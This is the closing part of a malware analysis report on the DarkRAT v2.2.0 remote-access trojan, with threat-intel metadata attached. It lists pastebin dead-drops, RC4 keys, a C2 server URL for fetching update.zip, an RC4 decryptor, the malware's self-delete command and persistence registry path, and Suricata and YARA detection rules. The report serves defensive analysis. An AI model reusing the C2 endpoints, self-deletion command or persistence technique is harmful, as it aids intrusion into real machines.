v2\\Client\\Client\\obj\\Debug\\Client.pdb\nD:\\DarkRat\\plugintester\\Release\\Monero_cpu.pdb\nD:\\DarkRat\\plugintester\\Release\\hvnc.pdb\n\n\n-----\n\nC:\\darkrat-master\\bot\\Release\\test.pdb\nC:\\Users\\lllll\\Desktop\\darkrat-master\\bot\\Release\\test.pdb\nC:\\Users\\lllll\\Desktop\\DarkCrypter-master\\Debug\\Stub.pdb\n\n**Pastebins**\n\n[https://pastebin.com/raw/YBGEBviB](https://pastebin.com/raw/YBGEBviB)\n\n[https://pastebin.com/raw/wAEXNbVF](https://pastebin.com/raw/wAEXNbVF)\n\n[https://pastebin.com/raw/EusfX8PQ](https://pastebin.com/raw/EusfX8PQ)\n\n[https://pastebin.com/raw/J7vpbEz6](https://pastebin.com/raw/J7vpbEz6)\n\n[https://pastebin.com/raw/Yd76WVbu](https://pastebin.com/raw/Yd76WVbu)\n\n[https://pastebin.com/raw/Qq0sfw23](https://pastebin.com/raw/Qq0sfw23)\n\n[https://pastebin.com/raw/YBGEBviB](https://pastebin.com/raw/YBGEBviB)\n\n[https://pastebin.com/raw/RCw33291](https://pastebin.com/raw/RCw33291)\n\n[https://pastebin.com/raw/3CC2ryd2](https://pastebin.com/raw/3CC2ryd2)\n\n[https://pastebin.com/raw/WeThNNxK](https://pastebin.com/raw/WeThNNxK)\n\n[https://pastebin.com/raw/NdUjPC1w](https://pastebin.com/raw/NdUjPC1w)\n\n[https://pastebin.com/raw/DPXyyALg](https://pastebin.com/raw/DPXyyALg)\n\n[https://pastebin.com/raw/muEbW4SF](https://pastebin.com/raw/muEbW4SF)\n\n[https://pastebin.com/raw/m2h5tLBG](https://pastebin.com/raw/m2h5tLBG)\n[https://pastebin.com/raw/JyTUuzPa](https://pastebin.com/raw/JyTUuzPa)\n\n[https://pastebin.com/raw/EznTvkbq](https://pastebin.com/raw/EznTvkbq)\n\n[https://pastebin.com/raw/H5UZsfyw](https://pastebin.com/raw/H5UZsfyw)\n\n[https://pastebin.com/raw/dNqyCpKw](https://pastebin.com/raw/dNqyCpKw)\n\n[https://pastebin.com/raw/MmBK5bMH](https://pastebin.com/raw/MmBK5bMH)\n\n[https://pastebin.com/raw/HemhJqcW](https://pastebin.com/raw/HemhJqcW)\n\n[https://pastebin.com/raw/i1wTNE8w](https://pastebin.com/raw/i1wTNE8w)\n\n[https://pastebin.com/raw/R40x8Ax1](https://pastebin.com/raw/R40x8Ax1)\n\n[https://pastebin.com/raw/Xh46Jxgb](https://pastebin.com/raw/Xh46Jxgb)\n\n[https://pastebin.com/raw/pt3fxyTg](https://pastebin.com/raw/pt3fxyTg)\n\n[https://pastebin.com/raw/FYN0sb2Z](https://pastebin.com/raw/FYN0sb2Z)\n\n[https://pastebin.com/raw/RT7Yd0U4](https://pastebin.com/raw/RT7Yd0U4)\n\n[https://pastebin.com/raw/WRBztEKi](https://pastebin.com/raw/WRBztEKi)\n\n[https://pastebin.com/raw/vy8c6ZYT](https://pastebin.com/raw/vy8c6ZYT)\n\n[https://pastebin.com/raw/xZtv1ER4](https://pastebin.com/raw/xZtv1ER4)\n\n[https://pastebin.com/raw/AYNnn2Rh](https://pastebin.com/raw/AYNnn2Rh)\n\n[https://pastebin.com/raw/d1vxjfbT](https://pastebin.com/raw/d1vxjfbT)\n\n[https://pastebin.com/raw/hinKe47j](https://pastebin.com/raw/hinKe47j)\n\n[https://pastebin.com/raw/LNpvG48f](https://pastebin.com/raw/LNpvG48f)\n\n[https://pastebin.com/raw/0cyRbYZx](https://pastebin.com/raw/0cyRbYZx)\n\n[https://pastebin.com/raw/nQPFBUWs](https://pastebin.com/raw/nQPFBUWs)\n\n[https://pastebin.com/raw/x2fWhy40](https://pastebin.com/raw/x2fWhy40)\n\n**RC4 Encryption keys**\n\n28BED2E43A51F81DB74F9318BA1F1A1F\nwzXnjDj3i0pLHGhZJGMAkAdKLCpCDygH\n1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN3\n0x176B24B4c871Df6e0fE4E0c735Db075064b47Bc4\n1YqsiIPGf3mCzRuKqo46ZohUKeZFzTDH\n9C7BF1FECCE2AA3AA2F424178FD7\n\n\n-----\n\nagO2mW7VAEV2wxPHaU6FqIu18ZOvOkIC\nG29kZBPCKtzCc0IEWGNFssjPfFIoKasv\npZ2bEq15zrxIecBpXGR1TqjTSrvOgJiq\nDE4E24E3E9DEF1F54C1816AC26C18\n65s8fe8484sf6es8f4\nT9KTz7WlxDIwQ9mZbGTYnjsmAfaniwId\nTLBLz7KVoeWxOtvBuRsmEWVtiCdjgUDomUDd\nksuGN8Sm9Yi3BzN6E/yZ5/SfMWC0YFkp9Ot9\nGHyufDShu65hgduFGd98igfdp56hJugodf2\nKP9JHafuX8LZlfXe7r58vK8IxRhULkND\nLnqWwGjc3WIioIDbEQUUVHfuVNCgxSI1\n5POeBkhLRpl6NfFkxavzAYAhHVi5AD5E\nKouYwnCjHFjJcACwDTLiVW0tinMYVqxi\nSx4UDJ3HAlxNCiy1Xmvj8L8n84iqiFcr\ntMJJl1hIGXmbDZOQP3bUf4xI1Mj97OQa\ngNRyjhyuPpRc63DQIGtCMO6WXDRKxIft\nFA27B3E1FE89C2FC184158616C51E\n9DFF1BB88566612A34154A5A9D15F8\npAZukXJiQWqvGZOWCVbsEgZxhTP8inmp\nk7HkixO7Lvw84dwvYpZjSQxGqiEzjrbiahjU\nG29kZBPCKtzCc0IEWGNFssjPfFIoKasv\nKQCNAeDrybuzrcHcgjvrpr1b5yBz3K4PHsA\nGsjxvL85BkvzMLX2M4fL9EfF1ofGv88u\nq-}=6{)BuEV[GDeZy>\n5d41cf10s8gkirunmvnjadf541fvc2yk\neEqsFu818cs1pgZsrYCUkX2VDNhqOuqf\n1z0X3SrAJX2AphwscBsOifBXoFGPIlAN\nRudtfLhumk1Xf7WRTFfPyd0hkoU9yrec\n\n**Pastebin responses**\n\n[2.0.1;http://35.204.135.202/update.zip](http://35.204.135.202/update.zip)\n[2.1.3;http://35.204.135.202/update.zip](http://35.204.135.202/update.zip)\n4x+9ZolpV9+wS1xxlSmTQfPTglBPsSCsMhq3ceGt\ngh3nhIKYFaODSrZHXDnzSpo5a6uR1FkMSIpy5g==\nP0W0jVz9V+mZHlZn8hdG7StZ0IRo18Mi8gwrLWQ=\nOzE7OWprZGp9e3djcWF4YnxlYHF6NzY0OiwjMA==\n8GWOsCTVGdIXE7TlkX0A+50WXcdEfzHdbTSWVNr5\nXMtmuwemloM7PN8+9lgqowiS7Q36UkY3RthKWg==\nEQKv4vx/Q0GD9AjrLI+LrnXEfUVrs+52mPHvY4VaPHnt+A1TGg==\nAWtxLpEyiaQQitH0C4cvlXddVtquBWulwyOAAaUM\n89xoOk5h6JAJbplpn0plrlRI+a0pK9mEedupppY=\n2SN57pHzmmAc6WhkQPy/OEicdpjdkrG2IhXZyRditw==\n2SN57pHzmjZLsyM2HaniaVPdKcaD06b8IQXNzwY=\n2SN57pHzmjNIqjwzAqz/fl/GN4bRjaH8IwQ=\nP9qpEUWRPpy/X1nMoQCI5p4Y01fWcD26WPkA==\nIw+s940h3m8Zjd7mcnammzxV4+XZOn2RM0uZZV6H\n#7%;y~d.8(1>8,7?'89&2?;,\"~9& >&\"?�\n#%7;kld7(.?6e2,&~1. 6.\"7\nhc7BzjmDmm4+ROP4fF6rlDp0bz3d3oAxLWv+AiU=\n\n\n-----\n\ndk7D50YwGDUIzVlxfIMv7MvHyMSx+hhPr1YIiQ4=\nysXaSHDTtL90P60xvENuELmkmwVIWHQuwWTc\nTLBLz7KVoeC0IMTHvwY+Fnt1gzghy0P4jUbMyOI=\nZjfaMpfAyNn7Brw0ajZOqR71gAbEUeZ87uNDzT6BUzk9hjVruTGFwKgi\nk7HkixO7LqFlu4dlJtAiUFAL7jl4xLXyfh7Fyj0=\ntATvtchuYALVBVr+LkH4wKsKpGjIP42OplF0MZrXL+uIpQFNQA==\n5MWttHDEgA6/IK4iQFngwpmSeisqgJqWGH0sV0k=\niZ0rCLOxPeo1t7bR9X2OFUmqXd+6SxDGRsW5Wg==\nyQSaXNknA8x40o9QZjAM28BKOmm7gP5jlbYi7g==\nt8gca6tBA2QfGrZgaKcE/CLSmY6QId3MGeGLU4w=\nprCtUtZ/lz5V8auJmiRIQjCz60v2l6hz1ei7vzKM5TCyYw==\nm93fZdUWpDO95QSK6VEGFUUT/XFQHhWe/tSj4g==\nkeRwrh9WFcFmQWyJNMSKvR5ROys5oFT0QSbi88w=\n9jeIQeCYYPMLCZMpaXSM8x9D3reSZd+VDuE8+pgC\nt8gca6tBAzJIS/onN+df43yZ3JXRa97cDeea\nwGRmv2tlFuI1ZrqQzqeuVNMGLcF7ltc=\n\n**Scripts**\n```\n# RC4 decryptor\npastebin = '3CC2ryd2'\ndecrypted = file('3CC2ryd2.clean','wb')\nkey = 'DE4E24E3E9DEF1F54C1816AC26C18'\nwith open (pastebin, \"rb\") as pb:\n    data = pb.read()\n    S = range(256)\n    j = 0\nfor i in range(256):\n    j = (j + S[i] + ord(key[i % len(key)])) % 256\n    S[i], S[j] = S[j], S[i]\ni = 0\nj = 0\nfor char in data:\n    i = ( i + 1 ) % 256\n    j = ( j + S[i] ) % 256\n    S[i], S[j] = S[j], S[i]\n    decrypted.write(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))\ndecrypted.close()\n\n```\n**Sandbox links**\n\n\n-----\n\nhttps://hybrid[analysis.com/sample/1e318e24a9548f5d41ae49e76416b7f5b817393a0cd2c2aa2b96](https://hybrid-analysis.com/sample/1e318e24a9548f5d41ae49e76416b7f5b817393a0cd2c2aa2b9637c92cd07814)\n37c92cd07814\nhttps://hybrid[analysis.com/sample/8fc0120d9711a19292966c48e2eb367f26c2d874ab9fa4fd5cf7f5](https://hybrid-analysis.com/sample/8fc0120d9711a19292966c48e2eb367f26c2d874ab9fa4fd5cf7f5472bee692f)\n472bee692f\n[https://app.any.run/tasks/1f4898f6-f168-45f6-9cde-f4fc3108f6d6/](https://app.any.run/tasks/1f4898f6-f168-45f6-9cde-f4fc3108f6d6/)\n[https://app.any.run/tasks/4a2be20e-5b9b-4dce-bcbb-6654ccf7458d/](https://app.any.run/tasks/4a2be20e-5b9b-4dce-bcbb-6654ccf7458d/)\n[https://app.any.run/tasks/76a61009-b93c-404f-b9dd-c5d211c2456b/](https://app.any.run/tasks/76a61009-b93c-404f-b9dd-c5d211c2456b/)\n[https://app.any.run/tasks/abe2a17b-7d35-4e68-811d-945f5fa58d7c/](https://app.any.run/tasks/abe2a17b-7d35-4e68-811d-945f5fa58d7c/)\n[https://app.any.run/tasks/cdcc07a8-4bb7-4db2-b14f-e0559273c71f/](https://app.any.run/tasks/cdcc07a8-4bb7-4db2-b14f-e0559273c71f/)\n[https://app.any.run/tasks/aab8736c-8dc5-4ad0-ba70-5b15c568a47d/](https://app.any.run/tasks/aab8736c-8dc5-4ad0-ba70-5b15c568a47d/)\n[https://app.any.run/tasks/205d250e-d807-48aa-943b-922d11b1212b/](https://app.any.run/tasks/205d250e-d807-48aa-943b-922d11b1212b/)\n[https://cape.contextis.com/analysis/84762/](https://cape.contextis.com/analysis/84762/)\n[https://cape.contextis.com/analysis/84812/](https://cape.contextis.com/analysis/84812/)\n[https://cape.contextis.com/analysis/85291/](https://cape.contextis.com/analysis/85291/)\n\n**Other ASCII strings**\n\n\n-----\n\nABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\n0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\n2.1.3 (2.2.0)\ncmd.exe\nwscript.exe\nStartup failed, error:\nRequest failed, error:\ncmd.exe /C ping 127.0.0.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"\nSOFTWARE\\Microsoft\\Cryptography\nSOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v2.0.50727\nSOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.0\nSOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.5\nSOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v4\nSOFTWARE\\Microsoft\\Cryptography\nMachineGuid\nWindows\nSoftware\\Microsoft\\Windows\\CurrentVersion\\Run\nWinSystem32\nNtUnmapViewOfSection\nIsWow64Process\ncmd.exe /k start\n\\Microsoft\\Windows\\\nAPPDATA\n.exe\n/C start\nC:\nkillpersistence\nPOST\nrequest=\nContent-Type: application/x-www-form-urlencoded\ntext/plain\n&taskid=\n&taskstatus=\nMozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46\n(KHTML, like Gecko) Version/5.1 > Mobile/9A334 Safari/7534.48.3\npastebin.com/raw/\nhttps://\nhttp://\nftp://\ninstalled\nopen\nrestart\nfailed\nsuccess\ntodo\n\n**Suricata rules**\n\n\n-----\n\n```\n y _ _\nalert tcp any any -> any $HTTP_PORTS (msg:\"Darkrat Initial Request\";\nflow:to_server,established; \ncontent:\"POST\"; http_method; content:\"request\"; http_uri; content:\"request=\";\nhttp_client_body; \nreference:url,github.com/albertzsigovits/malware-writeups/tree/master/DarkRATv2; \nclasstype:trojan-activity; sid:20166304; rev:1; metadata:created_at 2019_08_15;)\nET TROJAN Win32/DarkRAT CnC? Activity\nhttps://doc.emergingthreats.net/bin/view/Main/2027886\nalert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET TROJAN Win32/DarkRAT CnC?\nActivity\"; \nflow:established,to_server; content:\"POST\"; http_method; content:!\".php\"; http_uri; \ncontent:!\"Mozilla\"; http_user_agent; pcre:\"/^[A-Za-z0-9]{3,10}$/Vs\"; \ncontent:\"request=YUhkcFpEM\"; http_client_body; depth:17; fast_pattern; \npcre:\"/^[A-Za-z0-9\\/\\+\\=]{100,}$/PRsi\"; http_header_names; content:!\"Referer\"; \nmetadata: former_category MALWARE; \nreference:url,github.com/albertzsigovits/malware-writeups/tree/master/DarkRATv2;\nclasstype:trojan-activity; sid:2027886; rev:2;) \n\n```\n**YARA rules**\n\n\n-----\n\n```\n            p\nrule darkratv2\n{\nmeta:\n     author = \"Albert Zsigovits\"\nstrings:\n     $pdb = \"C:\\\\Users\\\\darkspider\" ascii wide\n     $cmd = \"cmd.exe /C ping 127.0.0.1 -n 1 -w 3000 > Nul & Del /f /q \\\"%s\\\"\"\nascii wide\n     $guid1 = \"SOFTWARE\\\\Microsoft\\\\Cryptography\" ascii wide\n     $guid2 = \"MachineGuid\" ascii wide\n     $persi1 = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" ascii wide\n     $persi2 = \"WinSystem32\" ascii wide\n     $bin = \"pastebin.com/raw/\" ascii wide\n     $import0 = \"NtUnmapViewOfSection\" ascii wide\n     $import1 = \"WriteProcessMemory\" ascii wide\n     $import2 = \"ResumeThread\" ascii wide\n     $import3 = \"GetNativeSystemInfo\" ascii wide\n     $import4 = \"URLOpenBlockingStream\" ascii wide\n     $import5 = \"VirtualFree\" ascii wide\n     $import6 = \"VirtualAlloc\" ascii wide\n     $import7 = \"GetModuleHandle\" ascii wide\n     $import8 = \"LoadLibrary\" ascii wide\n     $import9 = \"CreateMutex\" ascii wide\n     $vbs0 = \"Set objShell = WScript.CreateObject(\\\"WScript.Shell\\\")\" ascii wide\n     $vbs1 = \"Set objWMIService = GetObject(\\\"winmgmts:\\\\\\\\\\\" & sComputerName &\n\\\"\\\\root\\\\cimv2\\\")\" ascii wide\n     $vbs2 = \"Set objItems = objWMIService.ExecQuery(sQuery)\" ascii wide\n     $vbs3 = \"sQuery = \\\"SELECT * FROM Win32_Process\\\"\" ascii wide\n     $vbs4 = \"wscript.exe\" ascii wide\n     $net0 = \"POST\" ascii wide\n     $net1 = \"&taskid=\" ascii wide\n     $net2 = \"&taskstatus=\" ascii wide\n     $net3 = \"&spreadtag=\" ascii wide\n     $net4 = \"&operingsystem=\" ascii wide\n     $net5 = \"&arch=\" ascii wide\n     $net6 = \"&cpuName=\" ascii wide\n     $net7 = \"&gpuName=\" ascii wide\n     $net8 = \"&botversion=\" ascii wide\n     $net9 = \"&antivirus=\" ascii wide\n     $net10 = \"&netFramework4=\" ascii wide\n     $net11 = \"&netFramework35=\" ascii wide\n     $net12 = \"&netFramework3=\" ascii wide\n     $net13 = \"&netFramework2=\" ascii wide\n     $net14 = \"&installedRam=\" ascii wide\n     $net15 = \"&aornot=\" ascii wide\n     $net16 = \"&computername=\" ascii wide\n     $net17 = \"hwid=\" ascii wide\n     $net18 = \"request=\" ascii wide\ncondition:\n     $pdb or $cmd or ( all of ($guid*) and all of ($persi*) ) or ( 3 of ($vbs*) )\nor ( all of ($import*) and $bin ) or ( all of ($net*) )\n}\nrule Darkrat_bin\n{\n  meta:\n\n```\n\n-----\n\n```\n        p\n    author = \"James_inthe_box\"\n    reference = \"https://github.com/albertzsigovits/malwarewriteups/tree/master/DarkRATv2\"\n    date = \"2019/08\"\n    maltype = \"RAT\"\n  strings:\n    $string1 = \"Set objShell = WScript.CreateObject(\\\"WScript.Shell\\\")\"\n    $string2 = \"&taskstatus=\"\n    $string3 = \"network reset\"\n    $string4 = \"text/plain\"\n    $string5 = \"&antivirus=\"\n    $string6 = \"request=\"\n    $string7 = \"&arch=\"\n  condition:\n    uint16(0) == 0x5A4D and all of ($string*) and filesize < 600KB\n}\nrule Darkrat_mem\n{\n  meta:\n    description = \"Darkrat\"\n    author = \"James_inthe_box\"\n    reference = \"https://github.com/albertzsigovits/malwarewriteups/tree/master/DarkRATv2\"\n    date = \"2019/08\"\n    maltype = \"RAT\"\n  strings:\n    $string1 = \"Set objShell = WScript.CreateObject(\\\"WScript.Shell\\\")\"\n    $string2 = \"&taskstatus=\"\n    $string3 = \"network reset\"\n    $string4 = \"text/plain\"\n    $string5 = \"&antivirus=\"\n    $string6 = \"request=\"\n    $string7 = \"&arch=\"\n  condition:\n    all of ($string*) and filesize > 600KB\n}\n\n```\n_Other YARA rules:_ _[https://pastebin.com/es915exd](https://pastebin.com/es915exd)_\n\n**Hashes**\n\n**SHA256** **Compiled** **Size**\n\n07c41d2bdb251269b0883b0880068f1480443e4fbd0c9e6f4e5b1b5004148d1c 991232\n\n\n08c63d13d117642c4fda82efd1e4a3ba1468ba6d07eb73a80c96e666701fa004 13 Jun\n2019\n18:17:13\nUTC\n\n0e4a6a03b442efc5ae976ed57d66704e3a6c3393792adc1c1fe6a24d2da2352c 16 Jun\n2019\n21:29:36\nUTC\n\n\n414720\n\n415744\n\n\n-----\n\n0f98572f3fa5b70f51c5d090ff4414e0771414cea3309df33d97e9d675847f69 29 Jun\n2019\n05:44:02\nUTC\n\n1273fd18cfbe2f3caef7b29f749eb14b09cbd48a33e4c24c75c1486a416f66bd 22 Jun\n2019\n17:33:27\nUTC\n\n148a5bcaaea8c74e8871ef82e2e6af584d91ae6ddb4d3b36b710ea0ac41ca999 23 Apr\n2019\n18:49:43\nUTC\n\n1cc4577bbf9ca53ff285ea00ae41288a56e35d4472a97e4d7d65b749bce6ef11 01 Aug\n2019\n16:00:19\nUTC\n\n1e318e24a9548f5d41ae49e76416b7f5b817393a0cd2c2aa2b9637c92cd07814 02 Jul\n2019\n19:07:48\nUTC\n\n2856f4ff4ac68e06b8712cdb8f8a5319c95d1e2479edf2b80e0d7fd9c2b2e80a 11 May\n2018\n01:32:07\nUTC\n\n2d2402ec680759b43efb1f1e0bc298e88c34da475b49237dede926a67587b5d0 29 Jul\n2019\n22:05:33\nUTC\n\n2810b3924fe9d1f1642bc02c93e06391076341c8c7f8821da95f8a5b3bb14fa7 26 Jul\n2019\n20:40:31\nUTC\n\n2856f4ff4ac68e06b8712cdb8f8a5319c95d1e2479edf2b80e0d7fd9c2b2e80a 11 May\n2018\n01:32:07\nUTC\n\n30689bc02dd60fb674bd2e7f08fa2192d8cbeb94c8ae4c42617a698d53f1781a 09 Jun\n2019\n18:31:55\nUTC\n\n3328f642826f94536ec3db7387be182bdb38c85bc4df23e422d1de465573c6b9 04 Aug\n2019\n17:03:01\nUTC\n\n413fad039e9690ecc857d1c8cf90e132d521cc71d068f4286226affd66daa6e9 12 May\n2018\n14:19:21\nUTC\n\n\n411648\n\n929280\n\n272897\n\n418304\n\n411648\n\n560128\n\n411648\n\n411648\n\n560128\n\n414208\n\n417727\n\n502784\n\n\n-----\n\n72e2948d99856cc42584d095ce79202d4de3141e197d4a94c1e7f3b325c0d4b5 09 Jul\n2019\n20:04:11\nUTC\n\n763793e5725b92f61fbba97d15c8ded2817fb2623171a2db7eef94be5cc6729c 26 Jul\n2019\n20:42:02\nUTC\n\n88aab5d336162ec7acc074535966fc665c85f286bc652f884fd4a25dcdb1f37b 22 Jun\n2019\n17:33:27\nUTC\n\n8b1049117f561f5d4cf56258c7ca17551148e2c63af154ba04d96e1373d7dca0 05 Nov\n2018\n16:55:31\nUTC\n\n8fc0120d9711a19292966c48e2eb367f26c2d874ab9fa4fd5cf7f5472bee692f 05 Jul\n2019\n17:55:16\nUTC\n\n947461d7441512286618a6742282c2de9825d8295af0b5559bc6520711f476af 03 Jun\n2019\n19:45:15\nUTC\n\n9e65fa0964f3a81940ad88cb3652207e5ad050ac6aa8cadc9ae08f140b354b5f 09 May\n2018\n18:54:19\nUTC\n\na521906d8d60d94b14c63012d8ba7ded69b7bb5bde161c62bce8cc6e78434f8f 26 Jul\n2019\n20:42:02\nUTC\n\nbac3002b2f86de531ad50ac9163cad514bbc9d910cfce5fa3e0d6fb13589f05e 26 Apr\n1998\n12:47:14\nUTC\n\ncfa7f5ad7247d7d70fbbf4dce873fda9646e1964324e518030793ffa939dbd09 09 Jun\n2019\n18:31:55\nUTC\n\nd07f601b72c6f91c1689141934a1c13a256a283db28e0982202e61d7c07b3abb 23 Apr\n2019\n21:05:04\nUTC\n\ne5d48c09723b9de123a30c7b1b91987707fc51abcbf97578d7f9d9012157d28d 03 Aug\n2019\n21:02:54\nUTC\n\n\n412160\n\n411648\n\n410624\n\n525824\n\n411648\n\n475880\n\n531456\n\n177664\n\n556935\n\n410096\n\n272385\n\n418304\n\n\n-----\n\nf1803ca741edac689dc4bb3cc20d30ea79cdb5198d58347ea71d25ed40c0fec7 22 Jun\n2019\n17:33:27\nUTC\n\nf7d4c818939899d54b44929950c3e2b331b3787ceb8f72451c8bc375e0d79ac7 26 Jul\n2019\n20:42:02\nUTC\n\nfd07d37e18bc922e5d92aeca2267efeec02599a0e35bfaa1d5dce9e27fae735d 04 Aug\n2019\n17:03:01\nUTC\n\n\n410624\n\n411648\n\n417792\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-01-07 - DarkRat v2.2.0.pdf"
    ],
    "report_names": [
        "2020-01-07 - DarkRat v2.2.0.pdf"
    ],
    "threat_actors": [
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "08c8f238-1df5-4e75-b4d8-276ebead502d",
            "created_at": "2023-01-06T13:46:39.344081Z",
            "updated_at": "2025-03-27T02:00:03.056208Z",
            "deleted_at": null,
            "main_name": "Copy-Paste",
            "aliases": [],
            "source_name": "MISPGALAXY:Copy-Paste",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535693,
    "ts_updated_at": 1743041614,
    "ts_creation_date": 1653821392,
    "ts_modification_date": 1653821392,
    "files": {
        "pdf": "https://archive.orkl.eu/517856c465b1d0001c38f6e60caa4d0fa2bdc008.pdf",
        "text": "https://archive.orkl.eu/517856c465b1d0001c38f6e60caa4d0fa2bdc008.txt",
        "img": "https://archive.orkl.eu/517856c465b1d0001c38f6e60caa4d0fa2bdc008.jpg"
    }
}